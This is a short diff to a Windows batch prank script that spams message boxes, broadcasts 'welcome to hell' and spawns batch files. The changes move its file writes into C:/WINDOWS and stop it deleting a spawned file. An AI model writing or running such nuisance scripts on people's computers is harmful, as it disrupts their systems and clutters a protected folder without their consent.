@@ -14,6 +14,7 @@ echo: RUN THIS, I WILL NOT BR BLAMED!
 pause
 cls
 msg * welcome to hell
+cd C:/WINDOWS
 echo MsgBox('.') >>a.vbs
 echo MsgBox('y') >>a.vbs
 start a.vbs
@@ -30,9 +31,9 @@ echo msg * is this a MEMZ reference?!?! >>msg.bat
 start msg.bat
 start msg.bat
 start msg.bat
-del msg.bat
 echo mode 200,200 >>big.bat
 echo mode 100,100 >>small.bat
 start big.bat
 start small.bat
+
 
